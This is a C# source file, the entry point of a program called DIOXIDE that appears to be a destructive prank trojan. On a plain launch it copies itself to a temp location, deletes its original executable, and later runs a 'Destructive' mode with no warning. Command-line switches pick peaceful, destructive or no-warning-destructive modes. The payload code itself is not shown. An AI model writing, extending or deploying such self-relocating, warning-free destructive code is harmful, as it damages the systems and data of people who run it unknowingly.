using System;
using System.IO;
using System.Windows.Forms;

namespace DIOXIDE
{
    class main
    {
        static FileIO FileIO = new FileIO();
        static void Main(string[] cmd)
        {
            Application.EnableVisualStyles();
            Win32API.SetProcessDPIAware();

            if (cmd.Length == 0)
            {
                if (File.Exists(FileIO.TempPath + "Dioxide."))
                {
                    FileIO.DeleteTemp();
                    execute.executeD();
                }
                else
                {
                    FileIO.Create();
                    FileIO.Copy();
                    FileIO.DeleteEXE();
                }
            }
            else
            {
                for (int i = 0; i < cmd.Length; i++)
                {
                    if (cmd[i] == "/P")
                    {
                        execute.executeP();
                    }
                    if (cmd[i] == "/D")
                    {
                        execute.executeD();
                    }
                    if (cmd[i] == "/NWD")
                    {
                        execute.executeNWD();
                    }
                    if (cmd[i] == "/EWP")
                    {
                        execute.executeEWP();
                    }
                    if (cmd[i] == "/help")
                    {
                        MessageBox.Show("/P Peaceful" + Environment.NewLine + "/D Destructive" + Environment.NewLine + "/NWD NoWarningDestructive" + Environment.NewLine + "/EWP EnabledWarningPeaceful", "help", MessageBoxButtons.OK);
                    }
                }
            }
        }
    }
}